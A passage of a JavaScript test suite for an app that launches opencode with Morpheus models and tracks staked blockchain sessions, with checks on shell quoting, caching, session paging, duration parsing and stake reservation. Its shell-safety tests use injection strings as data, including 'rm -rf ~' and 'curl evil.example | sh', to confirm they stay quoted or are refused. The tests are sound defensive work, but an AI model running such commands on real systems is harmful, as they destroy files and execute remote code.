      new RegExp(`${fnName}:\\s*utils\\.forwardToMainProcess\\('${ipcName}'`).test(clientSrc));
  }

  // The renderer half: the picker host must be mounted and must report back.
  const routerSrc = read('../../src/renderer/src/components/Router.tsx');
  ok('the picker is actually mounted', /<StartPickerModal/.test(routerSrc));
  ok('and it listens for the request the supervisor sends',
    routerSrc.includes("'grok-picker-request'"));
  ok('and always reports the outcome back, so the terminal turn can end',
    routerSrc.includes('grokPickerDone'));

  // The supervisor must send exactly the event the renderer waits for.
  const supervisorUser = read('../../src/main/src/client/subscriptions/handlers.ts');
  ok('the supervisor sends that same event name',
    supervisorUser.includes("send('grok-picker-request'"));
  ok('and brings the window forward — /start happens in another app',
    supervisorUser.includes('bringAppToFront'));
}

// ---- launching with NO model, so /start can pick one ----
  // Requiring a model here is what made the plugin unreachable except through
  // the Chat handoff it exists to replace.
  {
    const noModel = buildLaunchScript({
      opencodePath: '/opt/homebrew/bin/opencode',
      configPath: '/tmp/morpheus.json',
      cwd: '/tmp',
    });
    ok('no model -> no -m flag', !/ -m /.test(noModel));
    ok('but the config is still exported',
      /OPENCODE_CONFIG='\/tmp\/morpheus.json'/.test(noModel));
    ok('and opencode is still exec\'d', /exec '\/opt\/homebrew\/bin\/opencode'/.test(noModel));
    const withModel = buildLaunchScript({
      opencodePath: '/opt/homebrew/bin/opencode',
      configPath: '/tmp/morpheus.json',
      modelId: 'deepseek-v4',
      cwd: '/tmp',
    });
    ok('a model still produces -m morpheus/<id>',
      / -m 'morpheus\/deepseek-v4'/.test(withModel));
  }

  // ---- shell safety ----
  ok('a plain model builds the expected command', (() => {
    const s = buildLaunchScript({
      opencodePath: '/opt/homebrew/bin/opencode',
      configPath: '/tmp/morpheus.json',
      modelId: 'deepseek-v4',
      cwd: '/Users/me/project',
    });
    return /exec '\/opt\/homebrew\/bin\/opencode' -m 'morpheus\/deepseek-v4'/.test(s)
      && /export OPENCODE_CONFIG='\/tmp\/morpheus\.json'/.test(s)
      && /cd '\/Users\/me\/project'/.test(s);
  })());

  // The config path is set via the env var — never by editing the user's own
  // opencode.jsonc, which we must not touch.
  ok('the handoff uses OPENCODE_CONFIG rather than the user config', (() => {
    const s = buildLaunchScript({
      opencodePath: '/x/opencode', configPath: '/y/c.json', modelId: 'm', cwd: '/z',
    });
    return s.includes('OPENCODE_CONFIG=') && !s.includes('.config/opencode/opencode.jsonc');
  })());

  ok('single quotes are escaped, not dropped',
    shellQuote(`it's`) === `'it'\\''s'`);

  // The injection cases. A model name is chain data; treat it as hostile.
  // Shell metacharacters must be QUOTED (they are legal in a name); control
  // characters must be REFUSED outright (they are not, and a multi-line token in
  // a generated .command file is unreviewable).
  const hostile = [
    "evil'; rm -rf ~; echo '",
    'evil$(whoami)',
    'evil`id`',
    'evil && curl evil.example | sh',
    'evil"; rm -rf ~; "',
  ];
  let leaked = null;
  for (const modelId of hostile) {
    const s = buildLaunchScript({
      opencodePath: '/opt/homebrew/bin/opencode',
      configPath: '/tmp/c.json',
      modelId,
      cwd: '/tmp',
    });
    const execLine = s.split('\n').find((l) => l.startsWith('exec ')) ?? '';
    // Everything after `-m ` must be ONE single-quoted token: no unescaped
    // quote may close it early, and no metacharacter may escape it.
    const arg = execLine.slice(execLine.indexOf(' -m ') + 4);
    const wellFormed = /^'(?:[^']|'\\'')*'$/.test(arg);
    if (!wellFormed) leaked = { modelId, arg };
  }
  ok('a hostile model name cannot break out of its quoting',
    leaked === null, leaked && JSON.stringify(leaked));

  // Control characters are refused rather than quoted. Quoting WOULD make them
  // safe, but the resulting command spans lines and cannot be reviewed by eye.
  const refuses = (input) => {
    try {
      buildLaunchScript(input);
      return false;
    } catch {
      return true;
    }
  };
  ok('a newline in a model name is REFUSED, not quoted',
    refuses({ opencodePath: '/o', configPath: '/c', modelId: 'a\nrm -rf ~', cwd: '/t' }));
  ok('a control character anywhere is refused',
    refuses({ opencodePath: '/o', configPath: '/c\u0000', modelId: 'm', cwd: '/t' }) &&
    refuses({ opencodePath: '/o', configPath: '/c', modelId: 'm', cwd: '/t\r' }));
  // And ordinary names with hyphens must still work — the guard must not be so
  // broad it rejects real model ids.
  ok('a normal hyphenated model id still builds',
    !refuses({ opencodePath: '/o', configPath: '/c', modelId: 'deepseek-v4', cwd: '/t' }));
}

// ---- the model-registry snapshot --------------------------------------------
// Measured against the local router: /blockchain/models takes 10.5 SECONDS while
// every sibling call in the same composite is sub-second or instant. Promise.all
// costs the slowest, so that one endpoint was the entire Chat load time.
//
// It is snapshot to disk because it is static. The danger in caching anything on
// this screen is caching the wrong thing: a stale BALANCE decides what the user
// believes they can afford to stake. So the checks below pin both halves — the
// registry is served from disk, and the money figures never are.
console.log('');
console.log('queries: the model registry is snapshot, the money is not');
{
  const realFetch = globalThis.fetch;
  const realLocalStorage = globalThis.localStorage;

  const store = new Map();
  globalThis.localStorage = {
    getItem: (k) => (store.has(k) ? store.get(k) : null),
    setItem: (k, v) => store.set(k, String(v)),
    removeItem: (k) => store.delete(k),
  };

  const calls = [];
  let balanceValue = 'BALANCE-1';
  let registryValue = [{ Id: 'm1', Name: 'First' }];
  const client = {
    getAuthHeaders: async () => ({}),
    getTodaysBudget: async () => 'BUDGET',
    getTokenSupply: async () => 'SUPPLY',
    getBalances: async () => balanceValue,
  };
  globalThis.fetch = async (url) => {
    const path = String(url).replace('http://r', '');
    calls.push(path);
    if (path === '/blockchain/models') {
      return { ok: true, json: async () => ({ models: registryValue }) };
    }
    if (path === '/blockchain/providers') {
      return { ok: true, json: async () => ({ providers: [] }) };
    }
    return { ok: true, json: async () => [] };
  };

  // First call: nothing on disk, so the registry must actually be fetched.
  calls.length = 0;
  const first = await buildModelsData('http://r', client);
  ok('cold: the registry is fetched', calls.includes('/blockchain/models'));
  ok('cold: models come back', first.models.some((m) => m.Id === 'm1'));

  // Second call: served from the snapshot. The registry request still goes out
  // (to refresh the snapshot) but is not waited on — what matters is that the
  // caller did not block on it, which the value proves: it is the OLD list even
  // though the endpoint now returns a different one.
  registryValue = [{ Id: 'm2', Name: 'Second' }];
  balanceValue = 'BALANCE-2';
  const second = await buildModelsData('http://r', client);
  ok('warm: the registry is served from the snapshot, not awaited',
    second.models.some((m) => m.Id === 'm1'));

  // The half that matters most: money is never snapshot.
  ok('warm: the BALANCE is live, not cached', second.userBalances === 'BALANCE-2');
  ok('warm: budget and supply are live', second.meta.budget === 'BUDGET' && second.meta.supply === 'SUPPLY');

  // An aged-out snapshot must not be served.
  store.set('morpheus.marketplaceModels.v1', JSON.stringify({
    ts: Date.now() - 60 * 60 * 1000, models: [{ Id: 'ancient' }],
  }));
  const aged = await buildModelsData('http://r', client);
  ok('an aged-out snapshot is refused, not served',
    !aged.models.some((m) => m.Id === 'ancient'));

  // Corrupt/empty snapshots must fall back rather than throw.
  store.set('morpheus.marketplaceModels.v1', 'not json');
  const corrupt = await buildModelsData('http://r', client);
  ok('a corrupt snapshot falls back to the network', corrupt.models.length > 0);
  store.set('morpheus.marketplaceModels.v1', JSON.stringify({ ts: Date.now(), models: [] }));
  const empty = await buildModelsData('http://r', client);
  ok('an empty snapshot is not treated as a valid answer', empty.models.length > 0);

  globalThis.fetch = realFetch;
  globalThis.localStorage = realLocalStorage;
}

// ---- the live-session window ------------------------------------------------
// Opening Chat used to walk the user's ENTIRE session history serially — one
// chain read per page — which measured at 19.8 SECONDS on a real wallet and was
// the whole Chat load time.
//
// Two properties have to hold together, and they pull against each other:
//   COMPLETE — every session that could still be OPEN must be returned, because
//     a live session missing from the list renders its chat as sessionless and
//     invites the user to pay for a second one.
//   BOUNDED — it must not read the whole history to prove that.
//
// The time bound (pages arrive newest-opened first, so once a page predates
// `now - cap*safety` everything older has ended) gives BOUNDED for old
// histories. It gives nothing when every session is recent — which is exactly
// the measured case — so the walk is also BATCHED, trading serial round trips
// for concurrent ones. Both are exercised below, against the real walker.
console.log('');
console.log('sessions: the live window is bounded, batched and complete');
{
  const CAP = 7 * 24 * 60 * 60;
  const DAY = 86400;
  const now = Math.floor(Date.now() / 1000);
  const ROUND = SESSION_PAGE_LIMIT * SESSION_PAGE_BATCH;

  const installFetch = (history, counter) => {
    globalThis.fetch = async (url) => {
      counter.pages++;
      const u = new URL(String(url), 'http://x');
      const offset = Number(u.searchParams.get('offset'));
      const limit = Number(u.searchParams.get('limit'));
      return { json: async () => ({ sessions: history.slice(offset, offset + limit) }) };
    };
  };
  const realFetch = globalThis.fetch;

  // A long history that is mostly ANCIENT: the time bound should end it after a
  // single round, without reading the rest.
  {
    const history = [];
    for (let i = 0; i < 10; i++) {
      history.push({ Id: `live${i}`, OpenedAt: now - 60 * i, EndsAt: now + 3600, ClosedAt: 0 });
    }
    while (history.length < ROUND * 5) {
      const i = history.length;
      history.push({ Id: `old${i}`, OpenedAt: now - 400 * DAY - i, EndsAt: now - 399 * DAY, ClosedAt: 1 });
    }
    const counter = { pages: 0 };
    installFetch(history, counter);
    const res = await getLiveSessionsByUser('http://r', '0xuser', {}, CAP);
    const liveIds = history.filter((s) => s.EndsAt > now).map((s) => s.Id);
    const gotIds = new Set(res.sessions.map((s) => s.Id));
    ok('complete: every live session is in the window',
      liveIds.every((id) => gotIds.has(id)));
    ok(`bounded: stopped after one round (${counter.pages} pages, history is ${Math.ceil(history.length / SESSION_PAGE_LIMIT)})`,
      counter.pages === SESSION_PAGE_BATCH);
    ok('it reports there IS a tail', res.complete === false);
    ok('the tail offset lines up with what was collected (no gap, no refetch)',
      res.nextOffset === res.sessions.length);
  }

  // The measured case: EVERY session is recent, so the time bound can skip
  // nothing. This is where batching alone does the work — the point is that the
  // pages are read concurrently, not that fewer are read.
  {
    const history = [];
    for (let i = 0; i < 1450; i++) {
      history.push({ Id: `recent${i}`, OpenedAt: now - 60 * i, EndsAt: now - 60 * i + 305, ClosedAt: 1 });
    }
    history[0] = { Id: 'open-now', OpenedAt: now - 10, EndsAt: now + 3600, ClosedAt: 0 };
    const counter = { pages: 0 };
    installFetch(history, counter);
    const res = await getLiveSessionsByUser('http://r', '0xuser', {}, CAP);
    ok('an all-recent history is still returned complete',
      res.sessions.length === history.length && res.complete === true);
    ok('and the live one is in it', res.sessions.some((s) => s.Id === 'open-now'));
    // The serial walk cost one round trip per page; batching costs one per
    // ROUND. That ratio is the entire fix for the 19.8s case.
    const serialTrips = Math.ceil(history.length / SESSION_PAGE_LIMIT);
    const batchedTrips = Math.ceil(counter.pages / SESSION_PAGE_BATCH);
    ok(`batched into ${batchedTrips} round trip(s) where serial paging needed ${serialTrips}`,
      batchedTrips < serialTrips);
  }

  // A short history is walked to the end and reports no tail.
  {
    const history = [{ Id: 'a', OpenedAt: now, EndsAt: now + 60, ClosedAt: 0 }];
    const counter = { pages: 0 };
    installFetch(history, counter);
    const res = await getLiveSessionsByUser('http://r', '0xuser', {}, CAP);
    ok('a short history reports complete', res.complete === true);
    ok('and returns everything', res.sessions.length === 1);
    ok('one round was enough', counter.pages <= SESSION_PAGE_BATCH);
  }

  // The adversarial case the safety factor exists for: a session opened LONG ago
  // that is somehow still open, because the cap was LOWERED after it opened.
  //
  // The layout is what makes this test mean anything. The bound is evaluated at
  // the END of each round, so round 1 must end just past ONE cap (8 days) and
  // the straggler must sit in round 2 (10 days) — inside cap*2, outside cap*1.
  // An earlier version put it where BOTH bounds fetch, so it passed with the
  // safety factor removed and proved nothing.
  {
    const history = [];
    for (let i = 0; i < ROUND; i++) {
      const age = Math.round((8 * DAY * i) / (ROUND - 1));
      history.push({ Id: `r1_${i}`, OpenedAt: now - age, EndsAt: now - age + 300, ClosedAt: 1 });
    }
    history.push({ Id: 'stale-live', OpenedAt: now - 10 * DAY, EndsAt: now + 3600, ClosedAt: 0 });
    while (history.length < ROUND * 3) {
      const i = history.length;
      history.push({ Id: `old${i}`, OpenedAt: now - 400 * DAY - i, EndsAt: now - 399 * DAY, ClosedAt: 1 });
    }
    const counter = { pages: 0 };
    installFetch(history, counter);
    const res = await getLiveSessionsByUser('http://r', '0xuser', {}, CAP);
    ok('a still-open session past ONE cap is caught (this is the safety factor)',
      res.sessions.some((s) => s.Id === 'stale-live'));
    ok('and it still did not read the whole history',
      counter.pages < Math.ceil(history.length / SESSION_PAGE_LIMIT));

    const counter1 = { pages: 0 };
    installFetch(history, counter1);
    const narrow = await getLiveSessionsByUser('http://r', '0xuser', {}, CAP, 1);
    ok('the fixture really does discriminate: factor 1 misses it',
      !narrow.sessions.some((s) => s.Id === 'stale-live'));
  }

  // Degenerate inputs must not spin forever or throw.
  {
    installFetch([], { pages: 0 });
    const res = await getLiveSessionsByUser('http://r', '0xuser', {}, CAP);
    ok('an empty history is complete and empty',
      res.complete === true && res.sessions.length === 0);
    const none = await getLiveSessionsByUser('', '', {}, CAP);
    ok('no url/user returns an empty complete window',
      none.complete === true && none.sessions.length === 0);
  }

  globalThis.fetch = realFetch;
}

// ---- typed session lengths --------------------------------------------------
// This parser turns text into a number that is multiplied into a stake, so its
// failure mode is financial, not cosmetic. The cases below pin the two ways it
// could quietly cost money: guessing a missing unit, and confusing two units
// that share a prefix.
console.log('');
console.log('duration: parsing a typed session length');
{
  const sec = (s) => {
    const r = parseDuration(s);
    return r.ok ? r.seconds : null;
  };
  ok('"1 day" = 86400', sec('1 day') === 86400);
  ok('"2 years" = 2 * 365d', sec('2 years') === 2 * 365 * 86400);
  ok('"90m" = 5400', sec('90m') === 5400);
  ok('"1.5 hours" = 5400', sec('1.5 hours') === 5400);
  ok('"8 hours" = 28800', sec('8 hours') === 28800);
  ok('case and spacing are irrelevant',
    sec(' 1 DAY ') === 86400 && sec('1day') === 86400);
  ok('every alias of a unit agrees',
    sec('1 y') === sec('1 yr') && sec('1 yr') === sec('1 year'));

  // The prefix trap: 'm' is minutes and 'mo' is months. Getting this wrong is a
  // 43,200x error in the stake, which is why matching is exact-alias only.
  ok('"5 m" is five MINUTES', sec('5 m') === 300);
  ok('"5 mo" is five MONTHS', sec('5 mo') === 5 * 30 * 86400);

  // A bare number is refused, not assumed. "5" meaning minutes when the user
  // meant days (or the reverse) is a 288x error nobody would catch.
  const bare = parseDuration('5');
  ok('a bare number does not parse', bare.ok === false);
  ok('a bare number reads as incomplete, not wrong', bare.incomplete === true);
  ok('mid-word units read as incomplete', parseDuration('2 ye').incomplete === true);
  ok('a real non-unit is an error, not incomplete',
    parseDuration('2 bananas').ok === false &&
    parseDuration('2 bananas').incomplete === false);
  ok('junk does not parse', parseDuration('soon').ok === false);
  ok('zero does not parse', parseDuration('0 days').ok === false);
  ok('negatives do not parse', parseDuration('-1 day').ok === false);
  ok('past the 10-year ceiling does not parse',
    parseDuration('11 years').ok === false &&
    parseDuration('10 years').ok === true);

  // Suggestions complete the unit; they never constrain the field.
  const s2 = durationSuggestions('2 m');
  ok('"2 m" suggests both minutes and months',
    s2.includes('2 minutes') && s2.includes('2 months'));
  ok('suggestions are whole phrases (a datalist replaces the whole value)',
    s2.every((x) => /^2 [a-z]+$/.test(x)));
  ok('a scalar of 1 suggests singular units',
    durationSuggestions('1 d').includes('1 day'));
  ok('an empty field still offers a vocabulary',
    durationSuggestions('').length > 0);
  ok('every suggestion parses back to a real duration',
    durationSuggestions('3 ').every((x) => parseDuration(x).ok));

  ok('formatDurationLong reads back what was typed',
    formatDurationLong(86400) === '1 day' &&
    formatDurationLong(2 * 365 * 86400) === '2 years' &&
    formatDurationLong(305) === '5 minutes 5 seconds');

  // EXACT, not a summary. A capped unit count quietly dropped up to 24 hours of
  // a length the user is paying to stake for. Re-add the seconds the words name
  // and they must come back to the input exactly, for every value.
  {
    const UNIT_SEC = {
      year: 365 * 86400, years: 365 * 86400,
      month: 30 * 86400, months: 30 * 86400,
      day: 86400, days: 86400,
      hour: 3600, hours: 3600,
      minute: 60, minutes: 60,
      second: 1, seconds: 1,
    };
    const readBack = (text) => {
      const parts = text.split(' ');
      let total = 0;
      for (let i = 0; i < parts.length; i += 2) {
        total += Number(parts[i]) * UNIT_SEC[parts[i + 1]];
      }
      return total;
    };
    let lossy = null;
    for (const sec of [
      305, 86400, 2 * 365 * 86400, 62535888, 98668799,
      // 1.983 years and 3y1mo16d — the two the reviewer measured as lossy.
      Math.round(1.983 * 365 * 86400), 7 * 86400 + 1, 31536000 - 1,
    ]) {
      if (readBack(formatDurationLong(sec)) !== sec) {
        lossy ??= { sec, text: formatDurationLong(sec), readBack: readBack(formatDurationLong(sec)) };
      }
    }
    ok('the echo names every second it stakes (no silent truncation)',
      lossy === null, lossy && JSON.stringify(lossy));
  }
  ok('formatDurationShort is compact',
    formatDurationShort(28800) === '8h' && formatDurationShort(305) === '5m 5s');
}

// ---- chat -> session binding (parallel sessions) ---------------------------
// The rule that makes two chats able to hold two DIFFERENT sessions on the same
// model and the same provider. The old behaviour resolved from the model, so
// every chat on a model collapsed onto the first open session; these pin that it
// cannot come back.
console.log('');
console.log('queries: resolveChatSession (per-chat session binding)');
{
  const S = (id, modelId, bidId) => ({ Id: id, ModelAgentId: modelId, BidID: bidId });
  // Two sessions, SAME model, SAME provider bid — the case that was unreachable.
  const s1 = S('0xsess1', '0xmodelA', '0xbidP');
  const s2 = S('0xsess2', '0xmodelA', '0xbidP');
  const open = [s1, s2];

  ok('bound chat resolves to ITS session, not the first for the model',
    resolveChatSession(open, { modelId: '0xmodelA', sessionId: '0xsess2' })?.Id === '0xsess2');
  ok('a second chat on the same model+provider resolves to the OTHER session',
    resolveChatSession(open, { modelId: '0xmodelA', sessionId: '0xsess1' })?.Id === '0xsess1');
  ok('two chats on one model do not collapse onto one session',
    resolveChatSession(open, { modelId: '0xmodelA', sessionId: '0xsess1' })?.Id !==
    resolveChatSession(open, { modelId: '0xmodelA', sessionId: '0xsess2' })?.Id);

  // The money property: a chat whose session closed must go READONLY, never
  // silently adopt a sibling session — that would bill its prompts elsewhere.
  ok('bound chat whose session closed -> undefined (readonly), NOT a sibling',
    resolveChatSession([s2], { modelId: '0xmodelA', sessionId: '0xsess1' }) === undefined);
  ok('bound chat never falls back to the model lookup',
    resolveChatSession(open, { modelId: '0xmodelA', sessionId: '0xgone' }) === undefined);

  // Legacy chats (no sessionId persisted) keep the old behaviour.
  ok('unbound chat falls back to the model lookup',
    resolveChatSession(open, { modelId: '0xmodelA' })?.Id === '0xsess1');
  ok('unbound chat on a model with no open session -> undefined',
    resolveChatSession(open, { modelId: '0xmodelB' }) === undefined);

  // Degenerate inputs must not throw — this runs on every chat switch.
  ok('no chat -> undefined', resolveChatSession(open, undefined) === undefined);
  ok('no modelId and no sessionId -> undefined', resolveChatSession(open, {}) === undefined);
  ok('no sessions -> undefined',
    resolveChatSession(undefined, { modelId: '0xmodelA' }) === undefined);

  // A legacy (unbound) chat must not land on a session a bound chat OWNS. The
  // old code recomputed that collision harmlessly every switch; the router now
  // PERSISTS it, so both chat files would permanently claim one session and bill
  // to it. Review executed exactly this and got 0xsessB for both chats.
  const chats = [
    { id: 'chatB', modelId: '0xmodelA', sessionId: '0xsess2' },
    { id: 'chatL', modelId: '0xmodelA' }, // legacy, no binding
  ];
  const claimedForL = sessionsClaimedByOtherChats(chats, 'chatL');
  ok('claimed set excludes the chat asking',
    claimedForL.has('0xsess2') && claimedForL.size === 1);
  ok('legacy chat skips a session another chat owns',
    resolveChatSession(open, chats[1], claimedForL)?.Id === '0xsess1');
  ok('legacy chat with EVERY session owned -> undefined, not theft',
    resolveChatSession(
      open,
      chats[1],
      new Set(['0xsess1', '0xsess2']),
    ) === undefined);
  ok('a bound chat ignores the claimed set (its own id is its own)',
    resolveChatSession(open, chats[0], new Set(['0xsess2']))?.Id === '0xsess2');

  // The reopen-orphan shape: the drawer row is stale, the live binding is newer.
  // selectChat must prefer the newer one or the just-paid-for session is lost.
  const staleRow = { id: 'chatA', modelId: '0xmodelA', sessionId: '0xexpired' };
  const liveBinding = '0xsess2';
  const merged = { ...staleRow, sessionId: liveBinding ?? staleRow.sessionId };
  ok('newer live binding wins over a stale drawer row',
    resolveChatSession(open, merged)?.Id === '0xsess2');
  ok('stale row alone would have resolved to nothing (the orphan bug)',
    resolveChatSession(open, staleRow) === undefined);
}

// ---- concurrent rolling runs: the wallet must not be oversubscribed ---------
// Each run's gate used to ask only "can I peak at 2x a block?" — true for every
// run in isolation, so N runs were approved against one block of headroom and
// the losers reverted having already paid for block 1. Measured: 9 runs on a
// 3.05 MOR wallet, combined peak 5.49. The gate now adds what the OTHER live
// runs still need. This replays the real formula.
console.log('');
console.log('queries: concurrent rolling runs vs. one wallet');
{
  // Mirrors Chat.tsx startRolling: required = (multiBlock ? 2 : 1) * perBlock
  //                                          + committedOverlapMor(others)
  const admit = (walletMor, perBlock, liveRuns, aggregate) => {
    const otherNeed = aggregate ? liveRuns * perBlock : 0;
    const required = 2 * perBlock + otherNeed;
    // Free balance falls by one locked block per live run.
    const free = walletMor - liveRuns * perBlock;
    return free >= required;
  };
  const admitted = (walletMor, perBlock, aggregate) => {
    let n = 0;
    while (admit(walletMor, perBlock, n, aggregate) && n < 50) n++;
    return n;
  };

  const WALLET = 3.05;
  const BLOCK = 0.305;
  // Without the aggregate reserve the gate lets in far more runs than the
  // wallet can carry through their overlaps.
  const naive = admitted(WALLET, BLOCK, false);
  const guarded = admitted(WALLET, BLOCK, true);
  // Worst case every live run hits its overlap together: each holds 2 blocks.
  const peak = (n) => n * 2 * BLOCK;

  ok('without an aggregate reserve the admitted runs can exceed the wallet',
    peak(naive) > WALLET,
    `admitted ${naive}, peak ${peak(naive).toFixed(3)} vs wallet ${WALLET}`);
  ok('aggregate reserve admits strictly fewer runs',
    guarded < naive, `guarded=${guarded} naive=${naive}`);
  ok('with the reserve, all admitted runs can overlap at once within the wallet',
    peak(guarded) <= WALLET + 1e-9,
    `guarded=${guarded} peak=${peak(guarded).toFixed(3)}`);
  ok('a wallet that cannot fund even one run admits none',
    admitted(BLOCK, BLOCK, true) === 0);
  ok('a fatter wallet admits more runs',
    admitted(10 * BLOCK, BLOCK, true) > admitted(4 * BLOCK, BLOCK, true));
}

// ---- closeSession must recognise EVERY block a run has opened ---------------
// Through the seamless overlap a run holds two open blocks and the drawer offers
// Close on both. Matching only the current block left the run restaking after
// the user closed its older one — and that close pays the early-close penalty.
console.log('');
console.log('queries: rolling-run ownership of a closed session');
{
  const ownerOf = (sessionIdsByChat, statuses, sessionId) =>
    Object.values(statuses).find(
      (s) => s.running && (sessionIdsByChat[s.chatId] || []).includes(sessionId),
    )?.chatId;
  const statuses = { chatR: { running: true, chatId: 'chatR' } };
  const ids = { chatR: ['0xb1', '0xb2', '0xb3'] };

  ok('current block resolves to its run', ownerOf(ids, statuses, '0xb3') === 'chatR');
  ok('the OVERLAPPING previous block also resolves to its run',
    ownerOf(ids, statuses, '0xb2') === 'chatR');
  ok('an older expired block still resolves (stopping is right either way)',
    ownerOf(ids, statuses, '0xb1') === 'chatR');
  ok('a session from no run resolves to nobody',
    ownerOf(ids, statuses, '0xother') === undefined);
  ok('current-block-only matching would have MISSED the overlap block',
    ({ chatR: '0xb3' }).chatR !== '0xb2');
}


// ---- entitlement + adoption, through the REAL exported helpers -------------
// An earlier version of these re-implemented the rules locally and passed with
// the production bug applied — green suite, shipped defect. They now import the
// same functions Chat.tsx calls, so a mutation in production fails here.
console.log('');
console.log('queries: claimedSessionIds / adoptableSessions');
{
  const live = { chatA: ['0xa1', '0xa2'] };
  const retained = { chatOld: ['0xold1'] };

  ok('a live run\'s ids are claimed',
    claimedSessionIds(live, retained, 'chatL').has('0xa2'));
  ok('an ENDED run\'s still-open block stays claimed',
    claimedSessionIds(live, retained, 'chatL').has('0xold1'));
  ok('a chat does not claim against itself',
    !claimedSessionIds(live, retained, 'chatA').has('0xa1'));
  ok('retained is not dropped when the same chat restarts a run',
    claimedSessionIds({ chatA: [] }, { chatA: ['0xprev'] }, 'chatL').has('0xprev'));
  ok('empty inputs are safe',
    claimedSessionIds(undefined, undefined, undefined).size === 0);

  const open = [{ Id: '0xa1' }, { Id: '0xold1' }, { Id: '0xfree' }];
  const adoptable = adoptableSessions(open, live, retained);
  ok('boot may adopt only the unowned session',
    adoptable.length === 1 && adoptable[0].Id === '0xfree');
  ok('boot may not adopt a live run block',
    !adoptable.some((s) => s.Id === '0xa1'));
  ok('boot may not adopt an ended run\'s still-open block',
    !adoptable.some((s) => s.Id === '0xold1'));
  ok('no runs -> everything adoptable',
    adoptableSessions(open, {}, {}).length === 3);
}


// ---- no-adoption + orphan surfacing ----------------------------------------
// Persisting the binding at OPEN time means any chat created since HAS one, so
// an unbound chat is either genuinely old or a lost bind. Guessing an owner for
// the second case is exactly how a paid session got billed to the wrong chat and
// the theft written to disk. Orphaning is bounded and visible; theft is not.
console.log('');
console.log('queries: adoption is refusable, orphans are surfaced');
{
  const S = (id, model) => ({ Id: id, ModelAgentId: model });
  const open = [S('0xfree', '0xmodelA'), S('0xmine', '0xmodelA')];
  const chats = [{ id: 'chatM', modelId: '0xmodelA', sessionId: '0xmine' }];

  ok('adoption ON: an unbound chat still takes an unclaimed session',
    resolveChatSession(open, { modelId: '0xmodelA' }, new Set(['0xmine']), true)?.Id === '0xfree');
  ok('adoption OFF: an unbound chat takes nothing',
    resolveChatSession(open, { modelId: '0xmodelA' }, new Set(['0xmine']), false) === undefined);
  ok('adoption OFF never affects a BOUND chat',
    resolveChatSession(open, { modelId: '0xmodelA', sessionId: '0xmine' }, new Set(), false)?.Id === '0xmine');

  ok('an unclaimed paid session is reported as an orphan',
    orphanedSessions(open, chats, {}, {}).map((s) => s.Id).join() === '0xfree');
  ok('a session a chat owns is not an orphan',
    !orphanedSessions(open, chats, {}, {}).some((s) => s.Id === '0xmine'));
  ok('a live run\'s block is not an orphan',
    orphanedSessions(open, [], { chatR: ['0xfree'] }, {}).length === 1);
  ok('an ended run\'s still-open block is not an orphan',
    !orphanedSessions(open, chats, {}, { chatOld: ['0xfree'] }).some((s) => s.Id === '0xfree'));
  ok('nothing open -> no orphans', orphanedSessions([], chats, {}, {}).length === 0);
}


// ---- a renewing run is 2x in BOTH modes -------------------------------------
// This block used to assert the opposite — that sequential ("economy") mode
// reserves 1x, because it closes each expired block and recycles that stake
// into the next one. Measured on Base mainnet 2026-08-06, the deployed Diamond
// does not do that: a late close returns only the UNUSED remainder (~0.06% of a
// block that ran to its end) and holds the used portion until the end of the
// UTC day. There is nothing to recycle, so both modes need new MOR per renewal.
console.log('');
console.log('queries: renewal stake reservation');
{
  // requiredFreeStake is the REAL predicate Chat.startRolling gates on, imported
  // rather than re-typed. It takes no mode argument at all now, which is the
  // structural form of "the mode cannot change the price".
  const CAP = 604800; // the deployed 7-day cap
  const required = (blocks, perBlock, blockSec = CAP) =>
    requiredFreeStake(blocks, perBlock, 0, blockSec);
  const B = 0.305;

  ok('a renewing run at the 7-day cap reserves 2x', required(10, B) === 2 * B);
  ok('a single block is 1x', required(1, B) === B);
  ok('two blocks already count as renewing', required(2, B) === 2 * B);
  ok('the predicate has no mode parameter to disagree about',
    requiredFreeStake.length === 4);
  ok('other runs\' commitments add on top',
    requiredFreeStake(1, B, 2 * B, CAP) === 3 * B);

  // The cap is OWNER-SETTABLE and read live. A flat 2x silently under-reserves
  // the moment it drops below a day, because several blocks' holds then overlap
  // inside one 24h window: the gate approves, block 1 is paid for, and a later
  // block reverts. Peaks below were cross-checked against a simulation of
  // planBlocks + the hold window.
  ok('a 1-day cap peaks at 3x, not 2x', peakBlockStakes(7, 86400) === 3);
  ok('a 12-hour cap peaks at 4x', peakBlockStakes(15, 43200) === 4);
  ok('a 1-hour cap peaks at 26x — a flat 2x would under-reserve 13-fold',
    peakBlockStakes(170, 3600) === 26);
  ok('the peak never exceeds the blocks actually opened',
    peakBlockStakes(3, 3600) === 3);
  ok('a short cap makes the gate demand more, not the same',
    required(170, B, 3600) > required(170, B, CAP));
  // Fail closed on a block size we cannot price rather than assuming 2x.
  ok('an unpriceable block size reserves for every block',
    peakBlockStakes(9, 0) === 9 && peakBlockStakes(9, NaN) === 9);

  // The close must still land AFTER expiry. It does not free the stake either
  // way, but an EARLY close forfeits the unused remainder it would have
  // refunded, and reopening before the chain settles the old block reverts.
  ok('the close buffer is positive — never fire at endsAt', CLOSE_BUFFER_SEC > 0);
  ok('sequential stride still prices the post-expiry gap',
    strideSeconds(false) > MIN_REQUEST_SECONDS);
  ok('seamless stride is still shorter than a block (it overlaps)',
    strideSeconds(true) < MIN_REQUEST_SECONDS);
}


// ---- the reserve counts EVERY live run, mode-independent -------------------
// Reported from a live pass: three running sessions blocked a new one on a
// wallet with plenty spare, and the error read "3.067758097729243e+21 MOR".
// The wei-printed-as-MOR half of that was a real bug and stays fixed. The other
// half — "economy recycles its own stake, so exclude it" — was a fix built on a
// contract that is not deployed, and it under-reserved: a sequential run needs
// its next block's stake as new money, because the previous one is held to the
// end of the UTC day. Excluding it let the gate approve unfundable runs.
console.log('');
console.log('queries: the reserve counts every live run');
{
  const B = 305000000000000000n; // one block's stake, in WEI
  // reserveWei is the REAL function committedOverlapWei delegates to. It works
  // in Number wei (that is what perBlockStakeWei carries), so compare in Number.
  const reserve = (runs, exceptChatId) =>
    BigInt(Math.round(reserveWei(Object.entries(runs), exceptChatId)));

  // A run with blocks still to open. total=3, opened=1 -> two left.
  const live = (overlap) => ({
    running: true, overlap, perBlockStakeWei: B, total: 3, openedSessionIds: ['a'],
  });

  const threeSequential = { a: live(false), b: live(false), c: live(false) };
  ok('three sequential runs reserve 3x, not nothing',
    reserve(threeSequential) === 3n * B);

  const mixed = { a: live(true), b: live(false), c: live(true) };
  ok('all three live runs reserve, whatever their mode', reserve(mixed) === 3n * B);
  ok('the asking chat is excluded', reserve(mixed, 'a') === 2n * B);
  ok('a stopped run reserves nothing regardless of mode',
